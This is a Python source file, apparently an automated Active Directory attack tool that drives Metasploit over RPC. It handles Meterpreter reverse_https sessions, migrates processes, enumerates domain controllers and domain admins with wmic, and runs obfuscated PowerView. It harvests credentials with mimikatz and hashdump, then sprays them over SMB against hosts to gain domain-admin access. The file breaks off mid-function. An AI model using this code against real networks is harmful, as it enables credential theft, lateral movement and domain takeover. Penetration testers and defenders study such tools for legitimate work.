#!/usr/bin/env python3

import re
import os
import sys
import time
import signal
import msfrpc
import string
import random
import asyncio
import argparse
import netifaces
from IPython import embed
from termcolor import colored
from netaddr import IPNetwork, AddrFormatError
from subprocess import Popen, PIPE, CalledProcessError
from libnmap.parser import NmapParser, NmapParserException

def parse_args():
    # Create the arguments
    parser = argparse.ArgumentParser()
    parser.add_argument("-l", "--hostlist", help="Host list file")
    parser.add_argument("-x", "--xml", help="Path to Nmap XML file")
    parser.add_argument("-p", "--password", default="123", help="Password for msfrpc")
    parser.add_argument("-u", "--username", default="msf", help="Username for msfrpc")
    parser.add_argument("--debug", action="store_true", help="Debug info")
    return parser.parse_args()

def convert_num(num):
    if type(num) == int:
        num = str(num)
    elif type(num) == bytes:
        num = num.decode('utf8')
    return num

# Colored terminal output
def print_bad(msg, label, num):
    if num:
        print(colored('[-] ', 'red') + '{} {} '.format(label, convert_num(num)).ljust(12)+'- '+msg)
    else:
        print(colored('[-] ', 'red') + msg)

def print_info(msg, label, num):
    if num:
        print(colored('[*] ', 'blue') + '{} {} '.format(label, convert_num(num)).ljust(12)+'- '+msg)
    else:
        print(colored('[*] ', 'blue') + msg)

def print_good(msg, label, num):
    if num:
        print(colored('[+] ', 'green') + '{} {} '.format(label, convert_num(num)).ljust(12)+'- '+msg)
    else:
        print(colored('[+] ', 'green') + msg)

def print_great(msg, label, num):
    if num:
        print(colored('[!] ', 'yellow', attrs=['bold']) + '{} {} '.format(label, convert_num(num)).ljust(12)+'- '+msg)
    else:
        print(colored('[!] ', 'yellow', attrs=['bold']) + msg)

def print_debug(msg, label, num):
    if num:
        print(colored('[DEBUG] ', 'cyan') + '{} {} '.format(label, convert_num(num)).ljust(12)+'- '+msg)
    else:
        print(colored('[DEBUG] ', 'cyan') + msg)

def debug_info(output, label, label_num):
    if args.debug:
        if output:
            for l in output.splitlines():
                l = l.decode('utf8')
                print_debug(l, label, label_num)
        else:
            print_debug('Metasploit returned None instead of output', label, label_num)

def end_script():
    kill_tasks()
    raise asyncio.CancelledError

def kill_tasks():
    print()
    print_info('Killing tasks then exiting', None, None)
    del_unchecked_hosts_files()
    for task in asyncio.Task.all_tasks():
        task.cancel()

def del_unchecked_hosts_files():
    for f in os.listdir():
        if f.startswith('unchecked_hosts-') and f.endswith('.txt'):
            os.remove(f)

def get_local_ip(iface):
    '''
    Gets the the local IP of an interface
    '''
    ip = netifaces.ifaddresses(iface)[netifaces.AF_INET][0]['addr']
    return ip

def get_iface():
    '''
    Gets the right interface for Responder
    '''
    try:
        iface = netifaces.gateways()['default'][netifaces.AF_INET][1]
    except:
        ifaces = []
        for iface in netifaces.interfaces():
            # list of ipv4 addrinfo dicts
            ipv4s = netifaces.ifaddresses(iface).get(netifaces.AF_INET, [])

            for entry in ipv4s:
                addr = entry.get('addr')
                if not addr:
                    continue
                if not (iface.startswith('lo') or addr.startswith('127.')):
                    ifaces.append(iface)

        iface = ifaces[0]

    return iface

async def run_sysinfo(client, sess_num, sess_data):
    # Sysinfo
    print_info('Getting session data', 'Session', sess_num)

    cmd = 'sysinfo'
    end_strs = [b'Meterpreter     : ']
    api_call = 'run_single'

    await make_session_busy(sess_num, sess_data)
    output, err = await run_session_cmd(client, sess_num, sess_data, cmd, end_strs)
    make_session_not_busy(sess_num, sess_data)

    if err:
        print_bad('Session appears to be broken', 'Session', sess_num)
        return [b'ERROR']
    else:
        sysinfo_split = output.splitlines()

    return sysinfo_split

async def run_getuid(client, sess_num, sess_data):
    # getuid
    cmd = 'getuid'
    end_strs = [b'Server username:']

    await make_session_busy(sess_num, sess_data)
    output, err = await run_session_cmd(client, sess_num, sess_data, cmd, end_strs)
    make_session_not_busy(sess_num, sess_data)
   
    if err:
        print_bad('Session appears to be dead', 'Session', sess_num)
        return [b'ERROR']
    else:
        user = output.split(b'Server username: ')[-1].strip().strip()
        sess_data[sess_num][b'user'] = user
        getuid = b'User            : ' + user
        return getuid

async def get_shell_info(client, sess_num, sess_data):

    sysinfo_split = await run_sysinfo(client, sess_num, sess_data)
    if sysinfo_split == [b'ERROR']:
        return sysinfo_split

    getuid = await run_getuid(client, sess_num, sess_data)
    if getuid == [b'ERROR']:
        return getuid

    shell_info = [getuid] + sysinfo_split

    return shell_info

#def is_domain_joined(user_info, domain):
#    if user_info != b'ERROR':
#        info_split = user_info.split(b':')
#        dom_and_user = info_split[1].strip()
#        dom_and_user_split = dom_and_user.split(b'\\')
#        dom = dom_and_user_split[0].lower()
#        user = dom_and_user_split[1]
#
#        if domain != b'no domain':
#            if dom.lower() in domain.lower():
#                return b'True'
#
#    return b'False'

def print_shell_data(shell_info, admin_shell, local_admin, sess_num_str):
    print_info('Meterpreter shell info', 'Session', int(sess_num_str))
    for l in shell_info:
        print('        '+l.decode('utf8'))
    msg =  '''        Admin shell     : {}
        Local admin     : {}
        Session number  : {}'''.format(
                              admin_shell.decode('utf8'),
                              local_admin.decode('utf8'),
                              sess_num_str)
    print(msg)

#async def meterpreter_sleep(sess_num, secs):
#    sess_data[sess_num][b'busy'] = b'True'
#    await asyncio.sleep(secs)
#    sess_data[sess_num][b'busy'] = b'False'

async def sess_first_check(lock, client, sess_num, sess_data, domain_data):

    if b'first_check' not in sess_data[sess_num]:

        sess_num_str = str(sess_num)
        print_good('New session {} found'.format(sess_num_str), 'Session', sess_num)
        clear_buffer = client.call('session.meterpreter_read', [sess_num_str])

        # Give it time to open
        print_info('Waiting 5 seconds for the session to completely open', 'Session', sess_num)
        await asyncio.sleep(5)

        sess_data[sess_num][b'busy'] = b'False'
        sess_data[sess_num][b'first_check'] = b'False'
        sess_data[sess_num][b'errors'] = []
        sess_data[sess_num][b'session_number'] = sess_num_str.encode()
        ip = sess_data[sess_num][b'tunnel_peer'].split(b':')[0]
        ip_data = b'IP              : '+ip

        print_good('Gathering shell info'.format(sess_num_str), 'Session', sess_num)

        shell_info = await get_shell_info(client, sess_num, sess_data)
        if shell_info == [b'ERROR']:
            return
        shell_info = [ip_data] + shell_info

        # Only run invoke-userhunter once unless it doesn't find any IPs
        if len(domain_data['high_priority_ips']) == 0:
            await run_userhunter(client, sess_num, sess_data, domain_data)

        # Get shell privileges
        admin_shell, local_admin = await check_privs(client, sess_num, sess_data)

#        # Get session domain from shell info
        #domain = get_domain(shell_info)
        #sess_data[sess_num][b'domain'] = domain
        #sess_data[sess_num][b'domain_joined'] = is_domain_joined(shell_info[1], domain)

        # Update domain_data for domain admins and domain controllers
        await domain_recon(lock, client, sess_num, sess_data, domain_data)

        # Check if it's a shell on a DC
        if ip.decode('utf8') in domain_data['domain_controllers'] and admin_shell == b'True':
            print_great('Admin shell on domain controller acquired!', 'Session', sess_num)
#            end_script()

        # Print the new shell's data
        print_shell_data(shell_info, admin_shell, local_admin, sess_num_str)

        # Migrate out of the process
        await run_priv_migrate(client, sess_num, sess_data)

async def domain_recon(lock, client, sess_num, sess_data, domain_data):

    sess_num_str = str(sess_num)
    print_info('Performing domain recon with wmic'.format(sess_num_str), 'Session', sess_num)
    await make_session_busy(sess_num, sess_data)
    await start_shell(client, sess_num, sess_data)

    # Update sess_data and domain_data
    domains_and_DCs = await get_domains_and_DCs(lock, client, sess_num, sess_data)
    if domains_and_DCs:
        for dom in domains_and_DCs:
            print_info('Domain and controllers: {}'.format(dom), 'Session', sess_num)
            for DC in domains_and_DCs[dom]:
                print('                                          '+DC)

            if dom in sess_data[sess_num]:
                sess_data[sess_num][b'domain'].append(dom)
            else:
                sess_data[sess_num][b'domain'] = [dom]
        domain_data['domains'].update(domains_and_DCs)

    # Update master list of DCs
    all_DCs = await combine_DCs(lock, domain_data)
    domain_data['domain_controllers'] = all_DCs

    # Get DAs
    DAs = await get_domain_admins(lock, client, sess_num, sess_data, domain_data)
    for da in DAs:
        print_info('Domain admin: '+da, 'Session', sess_num)
    domain_data['domain_admins'] = DAs

    await end_shell(client, sess_num, sess_data)
    make_session_not_busy(sess_num, sess_data)

async def combine_DCs(lock, domain_data):
    all_DCs = []
    with await lock:
        for d in domain_data['domains']:
            all_DCs += [x for x in domain_data['domains'][d]]
    return all_DCs

def parse_pid(output, user, proc):
    for l in output.splitlines():
        l_split = l.strip().split()

        # Normal users can't have spaces but we need to make exception for NT AUTHORITY
        if user.lower() == b'nt authority\\system':
            nt = b'NT'
            auth = b'AUTHORITY\\SYSTEM'
            if nt in l_split and auth in l_split:
                nt_offset = l_split.index(nt)
                auth_offset = l_split.index(auth)
                l_split.remove(auth)
                l_split[nt_offset] = nt+b' '+auth

        if proc in l_split and user in l_split:
            pid = l_split[0]
            return pid

#async def migrate_custom_proc(client, sess_num):
#
#    print_info('Migrating to stable process', 'Session', sess_num)
#
#    # Get own pid
#    cmd = 'getpid'
#    end_strs = [b'Current pid: ']
#    output, err = await run_session_cmd(client, sess_num, sess_data, cmd, end_strs)
#    if err:
#        return err
#    cur_pid = output.split(end_strs[0])[1].strip()
#
#    # Get stable proc's pid
#    cmd = 'ps'
#    end_strs = [b' PID    PPID']
#    output, err = await run_session_cmd(client, sess_num, sess_data, cmd, end_strs)
#    if err:
#        return err
#    user = sess_data[sess_num][b'user']
#    proc = b'explorer.exe'
#    pid = parse_pid(output, user, proc)
#    # In case user is NT AUTHORITY\\SYSTEM which has no explorer.exe
#    if not pid:
#        proc = b'lsass.exe'
#        pid = parse_pid(output, user, proc)
#
#    # When a session dies in this function its usually here that it errors out
#    if not pid:
#        msg = 'No migration PID found likely due to abrupt death of session'
#        print_bad(msg, 'Session', sess_num)
#        sess_data[sess_num][b'errors'].append(msg)
#        return msg
#
#    # If we're not already in the pid then migrate
#    if pid != cur_pid:
#        # Migrate to pid
#        cmd = 'migrate '+pid.decode('utf8')
#        end_strs = [b'Migration completed successfully.',
#                    b'Session is already in target process',
#                    b'[+] Already in',
#                    b'[+] Successfully migrated to']
#        output, err = await run_session_cmd(client, sess_num, sess_data, cmd, end_strs)
#
async def run_priv_migrate(client, sess_num, sess_data):
    print_info('Migrating to similar privilege process', 'Session', sess_num)
    cmd = 'run post/windows/manage/priv_migrate'
    end_strs = [b'Migration completed successfully.',
                b'Session is already in target process',
                b'[+] Already in',
                b'[+] Successfully migrated to']
    output, err = await run_session_cmd(client, sess_num, sess_data, cmd, end_strs)
    if err:
        return err

async def check_privs(client, sess_num, sess_data):

    cmd = 'run post/windows/gather/win_privs'
    end_strs = [b'==================']

    await make_session_busy(sess_num, sess_data)
    output, err = await run_session_cmd(client, sess_num, sess_data, cmd, end_strs)
    make_session_not_busy(sess_num, sess_data)
    if err:
        admin_shell = b'ERROR'
        local_admin = b'ERROR'

    else:
        split_out = output.splitlines()

        # Sometimes gets extra output from priv_migrate in this output
        offset = 5
        for num,l in enumerate(split_out):
            if b'True' in l or b'False' in l:
                offset = num

        user_info_list = split_out[offset].split()
        system = user_info_list[1]
        user = user_info_list[5]
        admin_shell = user_info_list[0]
        local_admin = user_info_list[2]

    sess_data[sess_num][b'admin_shell'] = admin_shell
    sess_data[sess_num][b'local_admin'] = local_admin

    return (admin_shell, local_admin)

async def exec_process(*cmd):
    p = await asyncio.create_subprocess_exec(*cmd,
                                             stdin=asyncio.subprocess.PIPE,
                                             stdout=asyncio.subprocess.PIPE,
                                             stderr=asyncio.subprocess.PIPE)
    stdout, stderr = await p.communicate()
    if stdout:
        stdout = stdout.decode('utf8')
    if stderr:
        stderr = stderr.decode('utf8')
    return (stdout, stderr)

async def host_to_ip(sess_num, host):
    stdout, stderr = await exec_process('host', host)
    if stderr:
        print_bad('Error converting host to IP: {}'.format(stderr), 'Session', sess_num)
    else:
        for l in stdout.splitlines():
            l = l.strip()
            if ' has address ' in l:
                ip = l.split()[-1]
                return ip

async def start_shell(client, sess_num, sess_data):
    ''' start OS cmd prompt on a meterpreter session '''
    cmd = 'shell'
    end_strs = [b'>']
    output, err = await run_session_cmd(client, sess_num, sess_data, cmd, end_strs)

async def end_shell(client, sess_num, sess_data):
    ''' ends OS cmd prompt on a meterpreter session '''
    cmd = 'exit'
    end_strs = [b'exit']
    output, err = await run_session_cmd(client, sess_num, sess_data, cmd, end_strs, api_call='write')

async def get_domains_and_DCs(lock, client, sess_num, sess_data):
    print_info('Getting domain controller', 'Session', sess_num)

    cmd = 'wmic NTDOMAIN GET DomainControllerAddress,DomainName /VALUE'
    end_strs = [b'>']

    output, err = await run_session_cmd(client, sess_num, sess_data, cmd, end_strs, api_call='write')
    if err:
        return

    output = output.decode('utf8')

    domains_and_DCs = parse_domain_wmic(output)

    return domains_and_DCs

def parse_domain_wmic(output):
    ''' Example output:

    DomainControllerAddress=
    DomainName=
    Roles=


    DomainControllerAddress=\\192.168.243.129
    DomainName=LAB2
    Roles= '''

    DC_str = 'DomainControllerAddress=\\\\'
    domain_str = 'DomainName='
    domains_and_DCs = {}
    DC = None

    # remove empty lines from output
    output = os.linesep.join([s for s in output.splitlines() if s])

    for l in output.splitlines():
        l = l.strip()

        if DC:
            if domain_str in l:
                domain = l.split(domain_str)[1].lower()
                if domain in domains_and_DCs:
                    domains_and_DCs[domain].append(DC)
                else:
                    domains_and_DCs[domain] = [DC]

            DC = None

        elif DC_str in l:
            DC = l.split(DC_str)[1]

    return domains_and_DCs

#def get_domain(shell_info):
#    for l in shell_info:
#
#        l = l.decode('utf8')
#
#        l_split = l.split(':')
#        if 'Domain      ' in l_split[0]:
#            if 'WORKGROUP' in l_split[1]:
#                return b'no domain'
#            else:
#                domain = l_split[-1].strip()
#                return domain.encode()

async def get_domain_admins(lock, client, sess_num, sess_data, domain_data):
    ''' Session is dropped into a cmd prompt prior to this function running '''
    print_info('Getting domain admins', 'Session', sess_num)
    end_strs = [b'>']

    domain_admins = []
    domains = []

    # Get domains
    with await lock:
        for domain in domain_data['domains']:
            domains.append(domain.lower())

    for domain in domains:
        cmd = 'wmic path win32_groupuser where (groupcomponent=\'win32_group.name="domain admins",domain="{}"\')'.format(domain)
        await make_session_busy(sess_num, sess_data)
        output, err = await run_session_cmd(client, sess_num, sess_data, cmd, end_strs, api_call='write')
        make_session_not_busy(sess_num, sess_data)
        if err:
            continue
        DAs = await parse_wmic_DA_out(output)
        domain_admins += DAs

    return domain_admins

async def parse_wmic_DA_out(output):
    ''' example line:
    win32_group.domain="lab2",name="domain admins"  \\WIN10-2\root\cimv2:Win32_UserAccount.Domain="lab2",Name="Administrator"
    '''
    DAs = []
    output = output.decode('utf8')
    for l in output.splitlines():
        if 'Win32_UserAccount.Domain' in l:
            l_split = l.split()
            # \\WIN10-2\root\cimv2:Win32_UserAccount.Domain="lab2",Name="Administrator"
            part_component = l_split[2]
            re_user = re.search('Name="(.*?)"',part_component)
            re_dom = re.search('Domain="(.*?)"',part_component)
            if re_user and re_dom:
                user = re_user.group(1)
                dom = re_dom.group(1)
                dom_user = dom+'\\'+user
                DAs.append(dom_user)

    return DAs

def update_session(msf_sess, msf_sess_num, sess_data):
    if msf_sess_num in sess_data:
        # Update session with the new key:value's in sess_data
        # This will not change any of the MSF session data, just add new key:value pairs
        sess_data[msf_sess_num] = add_session_keys(msf_sess, sess_data, msf_sess_num)
    else:
        sess_data[msf_sess_num] = msf_sess

async def get_windir(client, sess_num, sess_data):
    cmd = 'echo %WINDIR%'
    end_strs = [b'>']
    output, err = await run_session_cmd(client, sess_num, sess_data, cmd, end_strs, api_call='write')
    if err:
        return

    output = output.decode('utf8')
    for l in output.splitlines():
        if ':\\' in l:
            windir = l.strip()
            return windir

async def run_psh_cmd_with_output(client, sess_num, sess_data, ps_cmd):
    ''' There is no timeout setting for the powershell plugin in metasploit
    so shit just times out super fast. We hack around this by running long-running
    cmds then trying a fast cmd like write-host and wait until write-host actually
    works '''
    
    write_dir = await get_writeable_path(client, sess_num, sess_data)

    redir_out = ' > "{}\\cache"'.format(write_dir)
    cmd = 'powershell_execute \'{}{}\''.format(ps_cmd, redir_out)
    end_strs = [b'ThisStringShouldNeverAppear']

    await make_session_busy(sess_num, sess_data)
    # Make powershell_execute timeout immediately
    output, err = await run_session_cmd(client, sess_num, sess_data, cmd, end_strs)
    if err:
        # Timeouts are ineffective measures of whether the cmd is done
        # because MSF doesn't have a way of changing powershell_execute
        # timeout values. Timeouts are, however, effective at measuring
        # when the session is back to being available so we can then
        # try new PSH commands until they stop giving a specific error
        if 'Rex::TimeoutError' not in err:
            return

    # Check if cmd is done yet
    await wait_for_psh_cmd(client, sess_num, sess_data, cmd)
    
    # Download and read remote file
    path = '{}\\cache'.format(write_dir)
    output = await read_remote_file(client, sess_num, sess_data, path)
    output = output.decode('utf16').encode('utf8')

    make_session_not_busy(sess_num, sess_data)

    return output

async def parse_userhunter(output, sess_num, domain_data):
    for l in output.splitlines():
        l = l.strip()
        if b'IPAddress       :' in l:
            ip = l.split()[-1].decode('utf8')
            if ip not in domain_data['high_priority_ips']:
                print_good('IP with domain admin logged in: {}'.format(ip), 'Session', sess_num)
                domain_data['high_priority_ips'].append(ip)

    domain_data['high_priority_ips'].remove('pending')

async def read_remote_file(client, sess_num, sess_data, path):
    cmd = 'download "{}"'.format(path)
    end_strs = [b'[*] download   :', b'[*] skipped    :']
    output, err = await run_session_cmd(client, sess_num, sess_data, cmd, end_strs)
    if err:
        return

    cmd = 'rm "{}"'.format(path)
    # rm will return None which is caught as the end of the command
    output, err = await run_session_cmd(client, sess_num, sess_data, cmd, end_strs, timeout=5)

    filename = path.split('\\')[-1]
    with open(filename, 'rb') as f:
        content = f.read()

    return content

async def wait_for_psh_cmd(client, sess_num, sess_data, cmd):
    while True:
        running_ps_cmd = cmd.split()[1][1:] # knock off the first '
        end_str = 'Checking if [{}] has finished'.format(running_ps_cmd).encode()
        checking_cmd = 'powershell_execute "write-host Checking if [{}] has finished"'.format(running_ps_cmd)
        end_strs = [end_str]
        output, err = await run_session_cmd(client, sess_num, sess_data, checking_cmd, end_strs, api_call='write')
        if not err:
            break
        await asyncio.sleep(15)

async def get_writeable_path(client, sess_num, sess_data):
    if b'write_dir' in sess_data[sess_num]:
        write_dir = sess_data[sess_num][b'write_dir']
        return write_dir

    await make_session_busy(sess_num, sess_data)
    await start_shell(client, sess_num, sess_data)

    # System's write path will just be C:\windows\temp
    if b'authority\\system' in sess_data[sess_num][b'user'].lower():
        windir = await get_windir(client, sess_num, sess_data)
        write_path = windir+'\\temp'
        sess_data[sess_num][b'write_path'] = write_path

    # Regular user write path will be something like "C:\users\username\AppData\Local"
    else:
        # Get user's home directory
        cmd = 'echo %USERPROFILE%'
        out_lines = await run_shell_cmd(client, sess_num, sess_data, cmd)
        if out_lines:
            for l in out_lines:
                if ":\\" in l:
                    home_dir = l.strip()
                    break

            write_path = '{}\\AppData\\Local'.format(home_dir)
            sess_data[sess_num][b'write_path'] = write_path

    make_session_not_busy(sess_num, sess_data)
    await end_shell(client, sess_num, sess_data)

    return write_path

async def run_shell_cmd(client, sess_num, sess_data, cmd):
    end_strs = [b'>']
    output, err = await run_session_cmd(client, sess_num, sess_data, cmd, end_strs, api_call='write')
    if err:
        return
    
    return output.decode('utf8').splitlines()

async def run_userhunter(client, sess_num, sess_data, domain_data):

    print_info('Running Find-DomainUserLocation to collect IPs that domain admins are on', 'Session', sess_num)

    domain_data['high_priority_ips'].append('pending')

    plugin = 'powershell'
    output, err = await load_met_plugin(client, sess_num, sess_data, plugin)
    if err:
        domain_data['high_priority_ips'].remove('pending')
        return

    script_path = os.getcwd()+'/scripts/obf-pview.ps1'
    output, err = await powershell_import(client, sess_num, sess_data, script_path)
    if err:
        domain_data['high_priority_ips'].remove('pending')
        return

    cmd = 'Find-DomainUserLocation'
    output = await run_psh_cmd_with_output(client, sess_num, sess_data, cmd)
    if output:
        await parse_userhunter(output, sess_num, domain_data)
    else:
        domain_data['high_priority_ips'].remove('pending')


async def powershell_import(client, sess_num, sess_data, script_path):
    cmd = 'powershell_import '+ script_path
    end_strs = [b'successfully imported']

    await make_session_busy(sess_num, sess_data)
    output, err = await run_session_cmd(client, sess_num, sess_data, cmd, end_strs)
    make_session_not_busy(sess_num, sess_data)

    return (output, err)

async def load_met_plugin(client, sess_num, sess_data, plugin):
    cmd = 'load '+plugin
    end_strs = [b'Success.', b'has already been loaded.']

    await make_session_busy(sess_num, sess_data)
    output, err = await run_session_cmd(client, sess_num, sess_data, cmd, end_strs)
    make_session_not_busy(sess_num, sess_data)

    return (output, err)

async def run_mimikatz(lock, client, sess_num, sess_data, domain_data):

    # Load_met_plugin already keeps the session busy
    plugin = 'mimikatz'
    output, err = await load_met_plugin(client, sess_num, sess_data, plugin)
    if err:
        return

    cmd = 'wdigest'
    end_strs = [b'    Password']

    await make_session_busy(sess_num, sess_data)
    output, err = await run_session_cmd(client, sess_num, sess_data, cmd, end_strs)
    make_session_not_busy(sess_num, sess_data)

    if err:
        return

    mimikatz_split = output.splitlines()
    for l in mimikatz_split:

        if l.startswith(b'0;'):
            line_split = l.split(None, 4)

            # Output may include accounts without a password
            # Here's what I've seen that causes problems:
            #ob'AuthID        Package    Domain        User               Password'
            #b'------        -------    ------        ----               --------'
            #b'0;1299212671  Negotiate  IIS APPPOOL   DefaultAppPool     '
            #b'0;995         Negotiate  NT AUTHORITY  IUSR               '
            #b'0;997         Negotiate  NT AUTHORITY  LOCAL SERVICE      '
            #b'0;41167       NTLM                                        '

            if len(line_split) < 5:
                continue

            dom = line_split[2].lower()
            if dom.lower() in sess_data[sess_num][b'domain']:
                dom_user = '{}\\{}'.format(dom.decode('utf8').lower(), line_split[3].decode('utf8'))
                password = line_split[4]

                # Check if it's just some hex shit that we can't use
                if password.count(b' ') > 200:
                    continue

                if b'wdigest KO' not in password:
                    creds = '{}:{}'.format(dom_user, password.decode('utf8'))
                    if creds not in domain_data['creds']:
                        domain_data['creds'].append(creds)
                        msg = 'Creds found through Mimikatz: '+creds
                        print_good(msg, 'Session', sess_num)
                        await check_for_DA(lock, client, creds, sess_num, domain_data)

async def check_creds_against_DC(lock, client, sess_num, cred_data, domain_data):
    domain_data_key = 'domain_controllers'
    if domain_data_key in domain_data:

        dom_data_copy = domain_data.copy()
        print_info('Checking [{}:{}] against domain controllers'.format(cred_data[1], cred_data[2]), 'Session', sess_num)
        c_ids = [x[b'id'] for x in client.call('console.list')[b'consoles']]
        c_id = await get_nonbusy_cid(client, c_ids)

        filename = 'DCs'
        target_ips = create_hostsfile(dom_data_copy, filename, domain_data_key)
        threads = '1'
        dom = cred_data[0]
        user = cred_data[1]
        pwd = cred_data[2]
        lhost = get_local_ip(get_iface())

        cmd, output, err = await run_smb_login(client, c_id, lhost, threads, user, pwd, dom, target_ips)
        await parse_smb_login(lock, c_id, output, domain_data)

async def make_session_busy(sess_num, sess_data):
    while sess_data[sess_num][b'busy'] == b'True':
        await asyncio.sleep(1)
    sess_data[sess_num][b'busy'] == b'True'

def make_session_not_busy(sess_num, sess_data):
    sess_data[sess_num][b'busy'] == b'False'

async def check_for_DA(lock, client, creds, sess_num, domain_data):

    dom_user = creds.split(':', 1)[0]
    DAs = []
    cred_data = None

    # Get a copy of domain_data['domain_admins']
    with await lock:
        for x in domain_data['domain_admins']:
            DAs.append(x)

    # Got a hash
    if creds.count(':') > 5 and creds.endswith(':::'):
        hash_split = creds.split(':')
        user = hash_split[0]
        rid = hash_split[1]
        lm = hash_split[2]
        ntlm = hash_split[3]

        # In case there's a DA like LAB\Administrator we don't want to trigger
        # on all RID 500 Admin usernames
        if user.lower() == 'administrator':
            return

        if len(DAs) > 0:
            for c in DAs:
                da_user = c.split('\\')[1]
                if user.lower() == da_user.lower():
                    dom = '.'
                    lm_ntlm = lm+':'+ntlm
                    cred_data = (dom, user, lm_ntlm)
                    break

    # plaintext
    else:
        split_creds = creds.split(':', 1)
        dom_user = split_creds[0]
        pwd = split_creds[1]
        dom_user_split = dom_user.split('\\', 1)
        dom = dom_user_split[0]
        user = dom_user_split[1]
        for c in DAs:
            if dom_user.lower() == c.lower():
                cred_data = (dom, user, pwd)
                break

    if cred_data:
        msg = 'Potential domain admin found! '+creds
        print_good(msg, 'Session', sess_num)
        if len(domain_data['domain_controllers']) > 0:
            # This will run smb_login and parse_smb_login will tell us if its DA
            await check_creds_against_DC(lock, client, sess_num, cred_data, domain_data)

async def get_passwords(lock, client, sess_num, sess_data, domain_data):
    await run_mimikatz(lock, client, sess_num, sess_data, domain_data)
    await run_hashdump(lock, client, sess_num, sess_data, domain_data)
    #mimikittenz

async def run_hashdump(lock, client, sess_num, sess_data, domain_data):
    cmd = 'hashdump'
    end_strs = None

    await make_session_busy(sess_num, sess_data)
    output, err = await run_session_cmd(client, sess_num, sess_data, cmd, end_strs)
    make_session_not_busy(sess_num, sess_data)

    if err:
        return

    for l in output.splitlines():
        l = l.strip().decode('utf8')
        if l not in domain_data['creds']:
            domain_data['creds'].append(l)
            msg = 'Hashdump creds - '+l
            print_good(msg, 'Session', sess_num)
            #await check_for_DA(lock, client, l, sess_num, domain_data)

def get_console_ids(client):
    c_ids = [x[b'id'] for x in client.call('console.list')[b'consoles']]

    print_info('Opening Metasploit consoles', None, None)
    while len(c_ids) < 5:
        client.call('console.create')
        c_ids = [x[b'id'] for x in client.call('console.list')[b'consoles']] # Wait for response
        time.sleep(2)

    for c_id in c_ids:
        client.call('console.read', [c_id])[b'data'].decode('utf8').splitlines()

    return c_ids

async def run_msf_module(client, c_id, mod, rhost_var, target_ips, lhost, extra_opts, start_cmd, end_strs):

    payload = 'windows/x64/meterpreter/reverse_https'
    cmd = create_msf_cmd(mod, rhost_var, target_ips, lhost, payload, extra_opts, start_cmd)
    mod_out, err = await run_console_cmd(client, c_id, cmd, end_strs)

    return (cmd, mod_out, err)

def create_msf_cmd(module_path, rhost_var, target_ips, lhost, payload, extra_opts, start_cmd):
    cmds = ('use {}\n'
            'set {} {}\n'
            'set LHOST {}\n'
            'set payload {}\n'
            '{}\n'
            '{}\n').format(module_path, rhost_var, target_ips, lhost, payload, extra_opts, start_cmd)

    return cmds

async def run_console_cmd(client, c_id, cmd, end_strs):
    '''
    Runs module and gets output
    '''
    err = None
    cmd_split = cmd.splitlines()
    module = cmd_split[0].split()[1]
    print_info('Running MSF module [{}]'.format(module), 'Console', c_id)
    client.call('console.write',[c_id, cmd])

    output = await get_console_output(client, c_id, end_strs)
    err = get_output_errors(output, cmd)
    if err:
        print_bad(err, 'Console', c_id)

    return (output, err)

async def get_console_output(client, c_id, end_strs, timeout=60):
    '''
    The only way to get console busy status is through console.read or console.list
    console.read clears the output buffer so you gotta use console.list
    but console.list requires you know the list offset of the c_id console
    so this ridiculous list comprehension seems necessary to avoid assuming
    what the right list offset might be
    '''
    counter = 0
    sleep_secs = 1
    list_offset = int([x[b'id'] for x in client.call('console.list')[b'consoles'] if x[b'id'] is c_id][0])
    output = b''

    # Give it a chance to start
    await asyncio.sleep(sleep_secs)

    # Get any initial output
    output += client.call('console.read', [c_id])[b'data']

    while client.call('console.list')[b'consoles'][list_offset][b'busy'] == True:
        output += client.call('console.read', [c_id])[b'data']
        await asyncio.sleep(sleep_secs)
        counter += sleep_secs

    while True:
        output += client.call('console.read', [c_id])[b'data']

        if end_strs:

            if any(end_strs in output for end_strs in end_strs):
                break

        if counter > timeout:
            break

        await asyncio.sleep(sleep_secs)
        counter += sleep_secs

    # Get remaining output
    output += client.call('console.read', [c_id])[b'data']

    debug_info(output, 'Console', c_id)

    return output

async def get_nonbusy_cid(client, c_ids):
    while True:
        for c_id in c_ids:
            list_offset = int([x[b'id'] for x in client.call('console.list')[b'consoles'] if x[b'id'] is c_id][0])
            if client.call('console.list')[b'consoles'][list_offset][b'busy'] == False:
                return c_id
        await asyncio.sleep(1)

def plaintext_or_hash(creds):
    if creds.count(':') == 6 and creds.endswith(':::'):
        return 'hash'
    else:
        return 'plaintext'

def parse_creds(creds):
    cred_type = plaintext_or_hash(creds)
    if cred_type == 'hash':
        hash_split = creds.split(':')
        rid = hash_split[1]
        user = hash_split[0]
        lm = hash_split[2]
        ntlm = hash_split[3] # ntlm hash
        pwd = lm+':'+ntlm    # need lm:ntlm for PTH in metasploit
        dom = '.'            # this also means WORKGROUP or non-domain login in msf

    elif cred_type == 'plaintext':
        cred_split = creds.split(':')
        user = cred_split[0]
        # Remove domain from user
        if "\\" in user:
            user_split = user.split("\\")
            user = user_split[1]
            dom = user_split[0]
        pwd = cred_split[1]
        rid = None

    return dom, user, pwd, rid

async def spread(lock, client, c_ids, lhost, sess_data, domain_data):

    while True:
        # Copy the dict so we can loop it safely
        dom_data_copy = domain_data.copy()

        for c in dom_data_copy['creds']:
            if c not in dom_data_copy['checked_creds']:
                # Set up a dict where the key is the creds and the val are the hosts we are admin on
                dom_data_copy['checked_creds'][c] = []
                await run_smb_brute(lock, client, c_ids, lhost, c, sess_data, domain_data, dom_data_copy)

        await get_new_shells(lock, client, c_ids, lhost, sess_data, domain_data, dom_data_copy)

        await asyncio.sleep(1)

async def run_smb_login(client, c_id, lhost, threads, user, pwd, dom, target_ips):
    mod = 'auxiliary/scanner/smb/smb_login'
    rhost_var = 'RHOSTS'
    start_cmd = 'run'
    extra_opts = ('set threads {}\n'
                  'set smbuser {}\n'
                  'set smbpass {}\n'
                  'set smbdomain {}'.format(threads, user, pwd, dom))
    end_strs = [b'Auxiliary module execution completed']


    if 'file:' in target_ips:
        print_info('Spraying credentials [{}:{}] against hosts'.format(user, pwd), 'Console', c_id)
    else:
        print_info('Trying credentials [{}:{}] against {}'.format(user, pwd, target_ips), 'Console', c_id)

    cmd, output, err = await run_msf_module(client, c_id, mod, rhost_var, target_ips, lhost, extra_opts, start_cmd, end_strs)
    return (cmd, output, err)

async def run_smb_brute(lock, client, c_ids, lhost, creds, sess_data, domain_data, dom_data_copy):
    cred_type = plaintext_or_hash(creds)
    dom, user, pwd, rid = parse_creds(creds)
    threads = '32'

    # Just smb brute with rid 500 for now
